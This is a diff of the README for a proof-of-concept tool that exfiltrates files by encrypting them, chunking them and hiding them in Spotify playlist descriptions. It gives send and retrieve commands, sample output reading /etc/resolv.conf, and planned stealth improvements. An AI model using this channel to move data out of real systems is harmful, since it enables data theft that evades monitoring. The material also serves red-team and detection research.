@@ -1,66 +1,163 @@
 [![CodeQL](https://github.com/sourcefrenchy/spotexfil/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/sourcefrenchy/spotexfil/actions/workflows/codeql-analysis.yml)
 
-# spotexfil (status: prototype)
-A simple attempt to exfiltrate data using spotify API, 300 bytes at a time.
+# SpotExfil
 
-We can read a mini file (payload) and encode it inside a playlist description field via Spotify API.
-Really MVP/prototype, not meant for large files.
+A proof-of-concept covert channel that exfiltrates data through Spotify playlist descriptions, 300 bytes at a time.
 
-More info at https://medium.com/@jeanmichel.amblat/exfiltration-series-spotexfil-9aee76382b74
+More info at [Exfiltration Series: SpotExfil](https://medium.com/@jeanmichel.amblat/exfiltration-series-spotexfil-9aee76382b74)
 
-# Pre-requisite
-You need to register the app with Spotiy at https://developer.spotify.com/dashboard/
-
-Then, after using the first time, the following environment variables should be set such as:
-```
-SPOTIFY_USERNAME=YourSpotifyUsername
-SPOTIFY_CLIENT_SECRET=0de477a0733545a1a40e2e35d7b9d897
-SPOTIFY_CLIENT_ID=3a292c314830b8611963ac4fb2f29da1b
-SPOTIFY_REDIRECTURI=http://DOMAIN:PORT/PATH
-```
-
-# Usage
-
-Using /etc/resolv.conf as payload:
+## How It Works
 
 ```
-$ ./spotexfil_client.py -f /etc/resolv.conf
-[*] Data cleared
-"0614b19d74be941ac3a89fdcbc33d3ebc62cb996f574a1b3cb95867c1db90b87ca154ad38151a25e09d2b9429f66ad8d00afb005b1e257f89c27b030ca46ae3b6856574d3bc40476fd3c0703618f4ac4810dc59b7797dc1a873252de1017fd12205e99458eb0f40c4fa98db36cc972ec3c7f008541450e8269679fd6e54cf09ac432e002fdfb3be3ae85fa89373e0ad3c68af7bde50
-	[*] Creating inpayloadwetrust0
-b5118c7d5947d2f1a467069e3f2796b3859015741622226f58609dcee056954b42520dfeb8d09c1280fffb1e2c7178c3d46e0203b6284e14d08868e75bef729b939fee6e4edcd0e463f5b2797b40640eabf8940bfb8e82bde4bed531310b6e496066bad02a1a7bc4c854ef070a14166a6cd55f0c8f17c9c9ffaf79bef38c3dfaf6fd9d0ef1baf62589aad3c39bafd768cbe7ee48a10b
-	[*] Creating inpayloadwetrust300
-728a9be5127a45b5aa4b1a6f6cbd216f1e0ae80d843ad2f15a07ae721773eb529ea64963557196ba8bd29eca370ff3a8ae6d32f67251edb078619a4d97db332ccf432402a3a45b5675b82e6f8"
-	[*] Creating inpayloadwetrust600
-[*] Data encoded and sent
+                    SPOTIFY API
+                   (OAuth + REST)
+                   /            \
+            SENDER              RECEIVER
+         (client.py)          (retrieve.py)
+              |                     |
+        +-----------+        +-----------+
+        | File      |        | Reassemble|
+        | -> BLAKE2b|        | -> Decrypt|
+        | -> AES-GCM|        | -> Verify |
+        | -> Base64 |        | -> Output |
+        | -> Chunk  |        +-----------+
+        +-----------+
 ```
 
-Receiving from a far:
+1. **Encode**: Read file, compute BLAKE2b integrity hash, encrypt with AES-256-GCM, Base64-encode, wrap in JSON
+2. **Chunk**: Split payload into 300-byte pieces (Spotify playlist description limit)
+3. **Transmit**: Create private playlists with payload chunks as descriptions, add filler tracks from random artists
+4. **Retrieve**: Fetch playlists, sort by index, reassemble, decrypt, verify integrity hash
 
-$ ./spotexfil_retrieve.py -r
+## Features
+
+- **AES-256-GCM encryption** with PBKDF2-SHA256 key derivation (480K iterations)
+- **BLAKE2b integrity verification** on encode and decode
+- **Random filler tracks** from a pool of artists (not a single hardcoded artist)
+- **Paginated playlist handling** (no 50-playlist limit)
+- **Index-based ordering** for reliable reassembly regardless of API return order
+- **Legacy mode** (plaintext Base64) when no encryption key is provided
+
+## Prerequisites
+
+1. Register an app at [Spotify Developer Dashboard](https://developer.spotify.com/dashboard/)
+2. Add your redirect URI in the app settings (e.g., `http://127.0.0.1:8888/callback`)
+3. Set environment variables:
+
+```bash
+export SPOTIFY_USERNAME=YourSpotifyUsername
+export SPOTIFY_CLIENT_ID=your_client_id
+export SPOTIFY_CLIENT_SECRET=your_client_secret
+export SPOTIFY_REDIRECTURI=http://127.0.0.1:8888/callback
 ```
-#
+
+## Installation
+
+```bash
+pip install -r requirements.txt
+```
+
+For development (tests + linting):
+
+```bash
+pip install -r requirements-dev.txt
+```
+
+## Usage
+
+### Send (exfiltrate)
+
+```bash
+# Encrypted (recommended)
+./spotexfil_client.py -f /etc/resolv.conf -k "my-secret-passphrase"
+
+# Plaintext (legacy, no encryption)
+./spotexfil_client.py -f /etc/resolv.conf
+```
+
+### Receive (retrieve)
+
+```bash
+# Decrypt and print to stdout
+./spotexfil_retrieve.py -r -k "my-secret-passphrase"
+
+# Decrypt and save to file
+./spotexfil_retrieve.py -r -k "my-secret-passphrase" -o output.txt
+```
+
+### Example
+
+```
+$ ./spotexfil_client.py -f /etc/resolv.conf -k "demo-key"
+[*] Data cleared (0 playlists removed)
+[*] checksum plaintext 5673f6cea5b33041f92eab6f62a2b348a12f5d0d
+[*] payload encrypted with AES-256-GCM
+[*] Generating playlists
+    [*] Created 1-payloadChunk (300 bytes)
+    [*] Created 2-payloadChunk (300 bytes)
+    [*] Created 3-payloadChunk (42 bytes)
+[*] Data encoded and sent (3 playlists)
+
+$ ./spotexfil_retrieve.py -r -k "demo-key"
+[*] Retrieving playlists
+    [*] Retrieved 1-payloadChunk
+    [*] Retrieved 2-payloadChunk
+    [*] Retrieved 3-payloadChunk
+[*] Retrieved 3 chunks
+[*] integrity verified: 5673f6cea5b33041f92eab6f62a2b348a12f5d0d
 # macOS Notice
-#
-# This file is not consulted for DNS hostname resolution, address
-# resolution, or the DNS query routing mechanism used by most
-# processes on this system.
-#
-# To view the DNS configuration used by this system, use:
-#   scutil --dns
-#
-# SEE ALSO
-#   dns-sd(1), scutil(8)
-#
-# This file is automatically generated.
-#
-domain nyc.rr.com
-nameserver 172.16.0.1
+# This file is not consulted for DNS hostname resolution...
 ```
 
-# TODO
-* Working on Empire C2C module
-* move from XXTEA crappy easy crypto to asymmetric (working in separate branch)
-* peer-review from a real Python developper would help :P
-* build chat system, adding a realtime listener component into spotexfil_server.py
+## Testing
 
+```bash
+# Run all tests (62 tests)
+pytest tests/ -v
+
+# Run with coverage
+pytest tests/ --cov=. --cov-report=term-missing
+
+# Lint
+flake8 *.py tests/*.py
+```
+
+Test suite covers:
+- **Unit tests**: BLAKE2b hashing, AES-256-GCM encrypt/decrypt, key derivation, Base64 handling
+- **API tests**: Authentication, pagination, playlist CRUD (mocked Spotify API)
+- **Integration tests**: Full encode-chunk-reassemble-decode roundtrips with in-memory Spotify store
+
+## Project Structure
+
+```
+spotexfil/
+├── spotexfil_client.py     # CLI: exfiltrate a file
+├── spotexfil_retrieve.py   # CLI: retrieve exfiltrated data
+├── spotapi.py              # Spotify API wrapper (auth, playlists, chunking)
+├── encoding.py             # Encryption, encoding, integrity verification
+├── requirements.txt        # Runtime dependencies
+├── requirements-dev.txt    # Dev/test dependencies
+├── setup.cfg               # flake8 + pytest config
+└── tests/
+    ├── test_encoding.py    # Unit tests for encoding/crypto
+    ├── test_spotapi.py     # Mock-based API tests
+    └── test_integration.py # End-to-end roundtrip tests
+```
+
+## Limitations
+
+- **~600KB max payload** (~2000 playlists before Spotify limits)
+- **Slow for large files** (1 API call per 300-byte chunk)
+- **Spotify rate limits** may throttle bulk operations
+- Playlist naming pattern (`N-payloadChunk`) is detectable by network analysis
+
+## Disclaimer
+
+This is a **proof-of-concept for educational and authorized security research purposes only**. Do not use this tool for unauthorized data exfiltration. The author is not responsible for misuse.
+
+## TODO
+
+- Obfuscated/randomized playlist naming for improved stealth
+- Compression (gzip) for large payloads before encryption
+- Account rotation support
+- Real-time listener mode (chat system via `spotexfil_server.py`)
